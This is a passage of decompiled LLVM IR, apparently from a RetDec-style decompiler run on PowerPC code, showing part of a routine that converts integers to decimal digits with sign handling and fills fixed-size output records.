  %v0_10011acc = load i32, i32* @r7, align 4
  %v1_10011acc = icmp slt i32 %v0_10011acc, -4
  %v3_10011acc = icmp eq i32 %v0_10011acc, -4
  store i1 %v1_10011acc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011acc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10011acc, label %dec_label_pc_10011ae8, label %dec_label_pc_10011ad4

dec_label_pc_10011ad4:                            ; preds = %dec_label_pc_10011acc
  %v1_10011ad4 = load i32, i32* %r10.global-to-local, align 4
  %v2_10011ad4 = icmp sgt i32 %v1_10011ad4, %v0_10011acc
  %v3_10011ad4 = icmp slt i32 %v1_10011ad4, %v0_10011acc
  %v4_10011ad4 = icmp eq i32 %v1_10011ad4, %v0_10011acc
  store i1 %v2_10011ad4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011ad4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011ad4, label %dec_label_pc_10011ae8, label %dec_label_pc_10011adc

dec_label_pc_10011adc:                            ; preds = %dec_label_pc_10011ad4
  %v2_10011adc = sub i32 %v1_10011ad4, %v0_10011acc
  store i32 %v2_10011adc, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10011b08

dec_label_pc_10011ae8:                            ; preds = %dec_label_pc_10011ad4, %dec_label_pc_10011acc
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10011afc

dec_label_pc_10011af0:                            ; preds = %dec_label_pc_10011ab8
  %v0_10011af0 = load i32, i32* %r31.global-to-local, align 4
  %v1_10011af0 = icmp slt i32 %v0_10011af0, 102
  %v3_10011af0 = icmp eq i32 %v0_10011af0, 102
  store i1 %v1_10011af0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011af0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_10011af0, i32* %r4.global-to-local, align 4
  br i1 %v3_10011af0, label %dec_label_pc_10011b08thread-pre-split, label %dec_label_pc_10011afc

dec_label_pc_10011afc:                            ; preds = %dec_label_pc_10011af0, %dec_label_pc_10011ae8
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_10011b1c

dec_label_pc_10011b08thread-pre-split:            ; preds = %dec_label_pc_10011af0
  %v0_10011b08.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_10011b08

dec_label_pc_10011b08:                            ; preds = %dec_label_pc_10011b08thread-pre-split, %dec_label_pc_10011adc
  %v0_10011b0c = phi i32 [ %v0_10011b08.pr, %dec_label_pc_10011b08thread-pre-split ], [ %v0_10011acc, %dec_label_pc_10011adc ]
  %v1_10011b08 = icmp slt i32 %v0_10011b0c, 0
  %v2_10011b08 = icmp sgt i32 %v0_10011b0c, 0
  %v3_10011b08 = icmp eq i32 %v0_10011b0c, 0
  store i1 %v1_10011b08, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10011b08, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10011b08, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_10011b0c, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_10011b0c, -1
  br i1 %tmp78, label %dec_label_pc_10011b1c, label %dec_label_pc_10011b14

dec_label_pc_10011b14:                            ; preds = %dec_label_pc_10011b08
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_10011b18 = load i32, i32* %r8.global-to-local, align 4
  %v3_10011b18 = add i32 %v2_10011b18, -1
  %v4_10011b18 = inttoptr i32 %v3_10011b18 to i8*
  store i8 48, i8* %v4_10011b18, align 1
  store i32 %v3_10011b18, i32* %r8.global-to-local, align 4
  %v1_10011b38.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10011b4c.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_10011b1c

dec_label_pc_10011b1c:                            ; preds = %dec_label_pc_10011b08, %dec_label_pc_10011afc, %dec_label_pc_10011b14
  %v0_10011b4c = phi i1 [ %v1_10011b08, %dec_label_pc_10011b08 ], [ false, %dec_label_pc_10011afc ], [ %v0_10011b4c.pre, %dec_label_pc_10011b14 ]
  %v1_10011b38 = phi i32 [ %v1_10011ac4, %dec_label_pc_10011b08 ], [ %v1_10011ac4, %dec_label_pc_10011afc ], [ %v1_10011b38.pre, %dec_label_pc_10011b14 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_10011b28 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_10011b28, i32* %r0.global-to-local, align 4
  %v0_10011b30 = load i32, i32* %r8.global-to-local, align 4
  %v1_10011b30 = add i32 %v0_10011b30, 1
  store i32 %v1_10011b30, i32* %r6.global-to-local, align 4
  %v2_10011b38 = sub i32 %v1_10011b38, %v1_10011b30
  store i32 %v2_10011b38, i32* %r11.global-to-local, align 4
  %v1_10011b3c = inttoptr i32 %v0_10011b30 to i8*
  %v2_10011b3c = load i8, i8* %v1_10011b3c, align 1
  %v3_10011b3c = zext i8 %v2_10011b3c to i32
  store i32 %v3_10011b3c, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_10011b4c, label %dec_label_pc_10011bac, label %dec_label_pc_10011b50

dec_label_pc_10011b50:                            ; preds = %dec_label_pc_10011b1c
  %v0_10011b50 = load i32, i32* %r10.global-to-local, align 4
  %v2_10011b50 = icmp slt i32 %v0_10011b50, %v2_10011b38
  %v4_10011b50 = icmp eq i32 %v0_10011b50, %v2_10011b38
  store i1 %v2_10011b50, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011b50, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_10011b50, label %dec_label_pc_10011ba4, label %dec_label_pc_10011b64

dec_label_pc_10011b64:                            ; preds = %dec_label_pc_10011b50
  %v2_10011b64 = sub i32 %v0_10011b50, %v2_10011b38
  store i32 %v2_10011b64, i32* %r0.global-to-local, align 4
  %v4_10011b64 = icmp sgt i32 %v2_10011b64, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_10011b64, label %dec_label_pc_10011b80, label %dec_label_pc_10011b70

dec_label_pc_10011b70:                            ; preds = %dec_label_pc_10011b64
  %v2_10011b74 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10011b74, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011bc8

dec_label_pc_10011b80:                            ; preds = %dec_label_pc_10011b64
  store i32 ptrtoint (i32* @global_var_10017ae3.674 to i32), i32* %r9.global-to-local, align 4
  %v2_10011b8c = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_10011b8c, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_10011bc8

dec_label_pc_10011ba4:                            ; preds = %dec_label_pc_10011b50
  %v0_10011ba4 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10011ba4, label %dec_label_pc_10011bb4, label %dec_label_pc_10011ba8

dec_label_pc_10011ba8:                            ; preds = %dec_label_pc_10011ba4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011bac

dec_label_pc_10011bac:                            ; preds = %dec_label_pc_10011b1c, %dec_label_pc_10011ba8
  %v2_10011bac = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10011bac, i32* @r8, align 4
  br label %dec_label_pc_10011bc8

dec_label_pc_10011bb4:                            ; preds = %dec_label_pc_10011ba4
  %v2_10011bb4 = sub i32 %v2_10011b38, %v0_10011b50
  store i32 %v2_10011bb4, i32* %r11.global-to-local, align 4
  %v2_10011bbc = add i32 %v0_10011b50, %v1_10011b30
  store i32 %v2_10011bbc, i32* %r6.global-to-local, align 4
  %v2_10011bc0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10011bc0, i32* @r8, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011bc8

dec_label_pc_10011bc8:                            ; preds = %dec_label_pc_10011bac, %dec_label_pc_10011b80, %dec_label_pc_10011b70, %dec_label_pc_10011bb4
  %v1_10011bf4 = phi i32 [ %v2_10011bac, %dec_label_pc_10011bac ], [ %v2_10011b8c, %dec_label_pc_10011b80 ], [ %v2_10011b74, %dec_label_pc_10011b70 ], [ %v2_10011bc0, %dec_label_pc_10011bb4 ]
  %v0_10011bd4 = phi i32 [ %v2_10011b38, %dec_label_pc_10011bac ], [ 0, %dec_label_pc_10011b80 ], [ 0, %dec_label_pc_10011b70 ], [ %v2_10011bb4, %dec_label_pc_10011bb4 ]
  %v3_10011bc8 = load i32, i32* %v2_10011798, align 4
  store i32 %v3_10011bc8, i32* %r0.global-to-local, align 4
  %v1_10011bcc = and i32 %v3_10011bc8, 16
  store i32 %v1_10011bcc, i32* %r9.global-to-local, align 4
  %v3_10011bcc = icmp eq i32 %v1_10011bcc, 0
  br i1 %v3_10011bcc, label %dec_label_pc_10011bd4, label %dec_label_pc_10011bec

dec_label_pc_10011bd4:                            ; preds = %dec_label_pc_10011bc8
  %v1_10011bd4 = icmp slt i32 %v0_10011bd4, 0
  %v3_10011bd4 = icmp eq i32 %v0_10011bd4, 0
  store i1 %v1_10011bd4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011bd4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011bd4, label %dec_label_pc_10011bdc, label %dec_label_pc_10011bec

dec_label_pc_10011bdc:                            ; preds = %dec_label_pc_10011bd4
  %v0_10011bdc = load i32, i32* %r31.global-to-local, align 4
  %v1_10011bdc = icmp slt i32 %v0_10011bdc, 103
  %v3_10011bdc = icmp eq i32 %v0_10011bdc, 103
  store i1 %v1_10011bdc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011bdc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011bdc, label %dec_label_pc_10011c0c, label %dec_label_pc_10011be4

dec_label_pc_10011be4:                            ; preds = %dec_label_pc_10011bdc
  %v0_10011be4 = load i32, i32* %r30.global-to-local, align 4
  %v1_10011be4 = icmp slt i32 %v0_10011be4, 0
  %v3_10011be4 = icmp eq i32 %v0_10011be4, 0
  store i1 %v1_10011be4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011be4, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_10011be4, 1
  br i1 %tmp79, label %dec_label_pc_10011c0c, label %dec_label_pc_10011bec

dec_label_pc_10011bec:                            ; preds = %dec_label_pc_10011bd4, %dec_label_pc_10011bc8, %dec_label_pc_10011be4
  %v2_10011bf4 = inttoptr i32 %v1_10011bf4 to i32*
  store i32 112, i32* %v2_10011bf4, align 4
  store i32 ptrtoint (i32* @global_var_10017af0.675 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10011c00 = load i32, i32* @r8, align 4
  %v2_10011c00 = add i32 %v1_10011c00, 8
  %v3_10011c00 = inttoptr i32 %v2_10011c00 to i32*
  store i32 ptrtoint (i32* @global_var_10017af0.675 to i32), i32* %v3_10011c00, align 4
  %v0_10011c04 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011c04 = load i32, i32* @r8, align 4
  %v2_10011c04 = add i32 %v1_10011c04, 4
  %v3_10011c04 = inttoptr i32 %v2_10011c04 to i32*
  store i32 %v0_10011c04, i32* %v3_10011c04, align 4
  %v0_10011c08 = load i32, i32* @r8, align 4
  %v1_10011c08 = add i32 %v0_10011c08, 12
  store i32 %v1_10011c08, i32* @r8, align 4
  br label %dec_label_pc_10011c0c

dec_label_pc_10011c0c:                            ; preds = %dec_label_pc_10011be4, %dec_label_pc_10011bdc, %dec_label_pc_10011bec
  %v1_10011c1c = phi i32 [ %v1_10011bf4, %dec_label_pc_10011be4 ], [ %v1_10011bf4, %dec_label_pc_10011bdc ], [ %v1_10011c08, %dec_label_pc_10011bec ]
  %v0_10011c0c = load i32, i32* %r10.global-to-local, align 4
  %v1_10011c0c = add i32 %v0_10011c0c, 1
  store i32 %v1_10011c0c, i32* %r10.global-to-local, align 4
  %v4_10011c0c = icmp eq i32 %v1_10011c0c, 0
  br i1 %v4_10011c0c, label %dec_label_pc_10011c34, label %dec_label_pc_10011c14

dec_label_pc_10011c14:                            ; preds = %dec_label_pc_10011c0c
  %v1_10011c14 = sub i32 -1, %v0_10011c0c
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_10011c1c = add i32 %v1_10011c1c, 4
  %v3_10011c1c = inttoptr i32 %v2_10011c1c to i32*
  store i32 %v1_10011c14, i32* %v3_10011c1c, align 4
  store i32 ptrtoint (i32* @global_var_10017ae3.674 to i32), i32* %r9.global-to-local, align 4
  %v0_10011c28 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011c28 = load i32, i32* @r8, align 4
  %v2_10011c28 = inttoptr i32 %v1_10011c28 to i32*
  store i32 %v0_10011c28, i32* %v2_10011c28, align 4
  %v0_10011c2c = load i32, i32* %r9.global-to-local, align 4
  %v1_10011c2c = load i32, i32* @r8, align 4
  %v2_10011c2c = add i32 %v1_10011c2c, 8
  %v3_10011c2c = inttoptr i32 %v2_10011c2c to i32*
  store i32 %v0_10011c2c, i32* %v3_10011c2c, align 4
  %v0_10011c30 = load i32, i32* @r8, align 4
  %v1_10011c30 = add i32 %v0_10011c30, 12
  store i32 %v1_10011c30, i32* @r8, align 4
  br label %dec_label_pc_10011c34

dec_label_pc_10011c34:                            ; preds = %dec_label_pc_10011c0c, %dec_label_pc_10011c14
  %v1_10011c40 = phi i32 [ %v1_10011c1c, %dec_label_pc_10011c0c ], [ %v1_10011c30, %dec_label_pc_10011c14 ]
  %v0_10011c34 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011c34 = icmp slt i32 %v0_10011c34, 0
  %v3_10011c34 = icmp eq i32 %v0_10011c34, 0
  store i1 %v1_10011c34, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011c34, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011c34, label %dec_label_pc_10011c50, label %dec_label_pc_10011c3c

dec_label_pc_10011c3c:                            ; preds = %dec_label_pc_10011c34
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_10011c40 = load i32, i32* %r6.global-to-local, align 4
  %v2_10011c40 = add i32 %v1_10011c40, 8
  %v3_10011c40 = inttoptr i32 %v2_10011c40 to i32*
  store i32 %v0_10011c40, i32* %v3_10011c40, align 4
  %v0_10011c44 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011c44 = load i32, i32* @r8, align 4
  %v2_10011c44 = inttoptr i32 %v1_10011c44 to i32*
  store i32 %v0_10011c44, i32* %v2_10011c44, align 4
  %v0_10011c48 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011c48 = load i32, i32* @r8, align 4
  %v2_10011c48 = add i32 %v1_10011c48, 4
  %v3_10011c48 = inttoptr i32 %v2_10011c48 to i32*
  store i32 %v0_10011c48, i32* %v3_10011c48, align 4
  %v0_10011c4c = load i32, i32* @r8, align 4
  %v1_10011c4c = add i32 %v0_10011c4c, 12
  store i32 %v1_10011c4c, i32* @r8, align 4
  br label %dec_label_pc_10011c50

dec_label_pc_10011c50:                            ; preds = %dec_label_pc_10011c34, %dec_label_pc_10011c3c
  %v1_10011c78 = phi i32 [ %v1_10011c40, %dec_label_pc_10011c34 ], [ %v1_10011c4c, %dec_label_pc_10011c3c ]
  %v0_10011c50 = load i32, i32* %r31.global-to-local, align 4
  %v1_10011c50 = icmp slt i32 %v0_10011c50, 103
  %v3_10011c50 = icmp eq i32 %v0_10011c50, 103
  store i1 %v1_10011c50, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011c50, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011c50, label %dec_label_pc_10011c58, label %dec_label_pc_10011c64

dec_label_pc_10011c58:                            ; preds = %dec_label_pc_10011c50
  %v3_10011c58 = load i32, i32* %v2_10011798, align 4
  store i32 %v3_10011c58, i32* %r0.global-to-local, align 4
  %v1_10011c5c = and i32 %v3_10011c58, 16
  store i32 %v1_10011c5c, i32* %r9.global-to-local, align 4
  %v3_10011c5c = icmp eq i32 %v1_10011c5c, 0
  br i1 %v3_10011c5c, label %dec_label_pc_10011c90, label %dec_label_pc_10011c64

dec_label_pc_10011c64:                            ; preds = %dec_label_pc_10011c50, %dec_label_pc_10011c58
  %v0_10011c64 = load i32, i32* %r10.global-to-local, align 4
  %v1_10011c64 = load i32, i32* %r11.global-to-local, align 4
  %v2_10011c64 = sub i32 %v1_10011c64, %v0_10011c64
  store i32 %v2_10011c64, i32* %r9.global-to-local, align 4
  %v1_10011c68 = load i32, i32* %r30.global-to-local, align 4
  %v2_10011c68 = icmp sgt i32 %v1_10011c68, %v2_10011c64
  %v4_10011c68 = icmp eq i32 %v1_10011c68, %v2_10011c64
  store i1 %v2_10011c68, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011c68, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10011c68, label %dec_label_pc_10011c70, label %dec_label_pc_10011c90

dec_label_pc_10011c70:                            ; preds = %dec_label_pc_10011c64
  %v2_10011c70 = sub i32 %v1_10011c68, %v2_10011c64
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_10011c78 = add i32 %v1_10011c78, 4
  %v3_10011c78 = inttoptr i32 %v2_10011c78 to i32*
  store i32 %v2_10011c70, i32* %v3_10011c78, align 4
  store i32 ptrtoint (i32* @global_var_10017ae3.674 to i32), i32* %r9.global-to-local, align 4
  %v0_10011c84 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011c84 = load i32, i32* @r8, align 4
  %v2_10011c84 = inttoptr i32 %v1_10011c84 to i32*
  store i32 %v0_10011c84, i32* %v2_10011c84, align 4
  %v0_10011c88 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011c88 = load i32, i32* @r8, align 4
  %v2_10011c88 = add i32 %v1_10011c88, 8
  %v3_10011c88 = inttoptr i32 %v2_10011c88 to i32*
  store i32 %v0_10011c88, i32* %v3_10011c88, align 4
  %v0_10011c8c = load i32, i32* @r8, align 4
  %v1_10011c8c = add i32 %v0_10011c8c, 12
  store i32 %v1_10011c8c, i32* @r8, align 4
  br label %dec_label_pc_10011c90

dec_label_pc_10011c90:                            ; preds = %dec_label_pc_10011c64, %dec_label_pc_10011c58, %dec_label_pc_10011c70
  %v1_10011d2437 = phi i32 [ %v1_10011c78, %dec_label_pc_10011c64 ], [ %v1_10011c78, %dec_label_pc_10011c58 ], [ %v1_10011c8c, %dec_label_pc_10011c70 ]
  %v0_10011c90 = load i32, i32* %r4.global-to-local, align 4
  %v1_10011c90 = icmp slt i32 %v0_10011c90, 102
  %v3_10011c90 = icmp eq i32 %v0_10011c90, 102
  store i1 %v1_10011c90, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011c90, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011c90, label %dec_label_pc_10011d18, label %dec_label_pc_10011c98

dec_label_pc_10011c98:                            ; preds = %dec_label_pc_10011c90
  %v0_10011c98 = load i32, i32* @r7, align 4
  %v1_10011c98 = icmp slt i32 %v0_10011c98, 0
  %v3_10011c98 = icmp eq i32 %v0_10011c98, 0
  store i1 %v1_10011c98, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011c98, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_10011c98, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_10011c98, -1
  br i1 %tmp80, label %dec_label_pc_10011cb4, label %dec_label_pc_10011cac

dec_label_pc_10011cac:                            ; preds = %dec_label_pc_10011c98
  %v1_10011cac = sub i32 0, %v0_10011c98
  store i32 %v1_10011cac, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10011cb4

dec_label_pc_10011cb4:                            ; preds = %dec_label_pc_10011c98, %dec_label_pc_10011cac
  %v0_10011cc831 = phi i32 [ %v0_10011c98, %dec_label_pc_10011c98 ], [ %v1_10011cac, %dec_label_pc_10011cac ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10011cb8 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_10011cb8, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10011cc8

dec_label_pc_10011cc8:                            ; preds = %dec_label_pc_10011cc8.backedge, %dec_label_pc_10011cb4
  %v2_10011ce8 = phi i32 [ %v3_10011ce8, %dec_label_pc_10011cc8.backedge ], [ %v2_10011cb8, %dec_label_pc_10011cb4 ]
  %v0_10011ccc = phi i32 [ %v0_10011ccc.pre, %dec_label_pc_10011cc8.backedge ], [ 2, %dec_label_pc_10011cb4 ]
  %v1_10011cc8 = phi i32 [ %v1_10011cc8.pre, %dec_label_pc_10011cc8.backedge ], [ 10, %dec_label_pc_10011cb4 ]
  %v1_10011cdc = phi i32 [ %v0_10011cc8.pre, %dec_label_pc_10011cc8.backedge ], [ %v0_10011cc831, %dec_label_pc_10011cb4 ]
  %v2_10011cc8 = sdiv i32 %v1_10011cdc, %v1_10011cc8
  store i32 %v2_10011cc8, i32* %r0.global-to-local, align 4
  %v1_10011ccc = add i32 %v0_10011ccc, 1
  store i32 %v1_10011ccc, i32* @r7, align 4
  %v1_10011cd0 = icmp slt i32 %v1_10011ccc, 3
  %v3_10011cd0 = icmp eq i32 %v1_10011ccc, 3
  store i1 %v1_10011cd0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011cd0, i1* %cr7_eq.global-to-local, align 1
  %v1_10011cd8 = icmp slt i32 %v2_10011cc8, 0
  %v2_10011cd8 = icmp sgt i32 %v2_10011cc8, 0
  %v3_10011cd8 = icmp eq i32 %v2_10011cc8, 0
  store i1 %v1_10011cd8, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10011cd8, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10011cd8, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_10011cc8, -10
  store i32 %v2_10011cc8, i32* %r11.global-to-local, align 4
  %v2_10011cdc = add i32 %v1_10011cdc, 48
  %v1_10011ce4 = add i32 %v2_10011cdc, %tmp81
  store i32 %v1_10011ce4, i32* %r9.global-to-local, align 4
  %v1_10011ce8 = trunc i32 %v1_10011ce4 to i8
  %v3_10011ce8 = add i32 %v2_10011ce8, -1
  %v4_10011ce8 = inttoptr i32 %v3_10011ce8 to i8*
  store i8 %v1_10011ce8, i8* %v4_10011ce8, align 1
  store i32 %v3_10011ce8, i32* %r10.global-to-local, align 4
  %v0_10011cec = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10011cec = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10011cec = or i1 %v0_10011cec, %v1_10011cec
  br i1 %v2_10011cec, label %dec_label_pc_10011cc8.backedge, label %dec_label_pc_10011cf0

dec_label_pc_10011cc8.backedge:                   ; preds = %dec_label_pc_10011cc8, %dec_label_pc_10011cf0
  %v0_10011cc8.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10011cc8.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_10011ccc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10011cc8

dec_label_pc_10011cf0:                            ; preds = %dec_label_pc_10011cc8
  %v0_10011cf0 = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10011cf0, label %dec_label_pc_10011cf4, label %dec_label_pc_10011cc8.backedge

dec_label_pc_10011cf4:                            ; preds = %dec_label_pc_10011cf0
  %v1_10011cf4 = add i32 %v2_10011ce8, -2
  store i32 %v1_10011cf4, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_10011cfc = add i32 %v2_10011ce8, -3
  store i32 %v1_10011cfc, i32* %r11.global-to-local, align 4
  %v0_10011d00 = load i32, i32* %r4.global-to-local, align 4
  %v1_10011d00 = trunc i32 %v0_10011d00 to i8
  %v4_10011d00 = inttoptr i32 %v1_10011cf4 to i8*
  store i8 %v1_10011d00, i8* %v4_10011d00, align 1
  %v0_10011d04 = load i32, i32* %r5.global-to-local, align 4
  %v1_10011d04 = trunc i32 %v0_10011d04 to i8
  %v2_10011d04 = load i32, i32* %r9.global-to-local, align 4
  %v3_10011d04 = add i32 %v2_10011d04, -1
  %v4_10011d04 = inttoptr i32 %v3_10011d04 to i8*
  store i8 %v1_10011d04, i8* %v4_10011d04, align 1
  %v0_10011d08 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011d08 = load i32, i32* @r8, align 4
  %v2_10011d08 = inttoptr i32 %v1_10011d08 to i32*
  store i32 %v0_10011d08, i32* %v2_10011d08, align 4
  %v0_10011d0c = load i32, i32* @r7, align 4
  %v1_10011d0c = load i32, i32* @r8, align 4
  %v2_10011d0c = add i32 %v1_10011d0c, 4
  %v3_10011d0c = inttoptr i32 %v2_10011d0c to i32*
  store i32 %v0_10011d0c, i32* %v3_10011d0c, align 4
  %v0_10011d10 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011d10 = load i32, i32* @r8, align 4
  %v2_10011d10 = add i32 %v1_10011d10, 8
  %v3_10011d10 = inttoptr i32 %v2_10011d10 to i32*
  store i32 %v0_10011d10, i32* %v3_10011d10, align 4
  %v0_10011d14 = load i32, i32* @r8, align 4
  %v1_10011d14 = add i32 %v0_10011d14, 12
  store i32 %v1_10011d14, i32* @r8, align 4
  br label %dec_label_pc_10011d18

dec_label_pc_10011d18:                            ; preds = %dec_label_pc_10011c90, %dec_label_pc_1001186c, %dec_label_pc_10011cf4
  %v0_10011d94 = phi i32 [ %v1_10011d2437, %dec_label_pc_10011c90 ], [ %v2_10011878, %dec_label_pc_1001186c ], [ %v1_10011d14, %dec_label_pc_10011cf4 ]
  %v2_10011d18 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_10011d18, i32* %r9.global-to-local, align 4
  %v1_10011d28.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10011d1c

dec_label_pc_10011d1c:                            ; preds = %dec_label_pc_10011d1c, %dec_label_pc_10011d18
  %v1_10011d28 = phi i32 [ %v2_10011d28, %dec_label_pc_10011d1c ], [ %v1_10011d28.pre, %dec_label_pc_10011d18 ]
  %v0_10011d1c = phi i32 [ %v1_10011d20, %dec_label_pc_10011d1c ], [ %v2_10011d18, %dec_label_pc_10011d18 ]
  %v1_10011d1c = inttoptr i32 %v0_10011d1c to i32*
  %v2_10011d1c = load i32, i32* %v1_10011d1c, align 4
  store i32 %v2_10011d1c, i32* %r0.global-to-local, align 4
  %v1_10011d20 = add i32 %v0_10011d1c, 12
  store i32 %v1_10011d20, i32* %r9.global-to-local, align 4
  %v2_10011d24 = icmp ult i32 %v1_10011d20, %v0_10011d94
  %v2_10011d28 = sub i32 %v1_10011d28, %v2_10011d1c
  store i32 %v2_10011d28, i32* @r28, align 4
  br i1 %v2_10011d24, label %dec_label_pc_10011d1c, label %dec_label_pc_10011d30

dec_label_pc_10011d30:                            ; preds = %dec_label_pc_10011d1c
  %v4_10011d24 = icmp eq i32 %v1_10011d20, %v0_10011d94
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011d24, i1* %cr7_eq.global-to-local, align 1
  %v3_10011d30 = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_10011d94, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_10011d30, 0
  %v1_10011d44 = zext i1 %tmp85 to i32
  store i32 %v1_10011d44, i32* %r9.global-to-local, align 4
  %v2_10011d48 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_10011d48, i32* %r0.global-to-local, align 4
  %v2_10011d4c = sub i32 %v2_10011d28, %v1_10011d44
  store i32 %v2_10011d4c, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_10011d4c, 1
  br i1 %tmp82, label %dec_label_pc_10011db8, label %dec_label_pc_10011d5c

dec_label_pc_10011d5c:                            ; preds = %dec_label_pc_10011d30
  %v3_10011d5c = load i32, i32* %v2_10011798, align 4
  store i32 %v3_10011d5c, i32* %r0.global-to-local, align 4
  %v1_10011d60 = and i32 %v3_10011d5c, 8
  store i32 %v1_10011d60, i32* @r7, align 4
  %v3_10011d60 = icmp eq i32 %v1_10011d60, 0
  br i1 %v3_10011d60, label %dec_label_pc_10011d84, label %dec_label_pc_10011d68

dec_label_pc_10011d68:                            ; preds = %dec_label_pc_10011d5c
  %v1_10011d6c = add i32 %v0_10011d94, 12
  store i32 %v1_10011d6c, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10017ae3.674 to i32), i32* %r9.global-to-local, align 4
  %v2_10011d74 = inttoptr i32 %v0_10011d94 to i32*
  store i32 160, i32* %v2_10011d74, align 4
  %v0_10011d78 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011d78 = load i32, i32* @r8, align 4
  %v2_10011d78 = add i32 %v1_10011d78, 4
  %v3_10011d78 = inttoptr i32 %v2_10011d78 to i32*
  store i32 %v0_10011d78, i32* %v3_10011d78, align 4
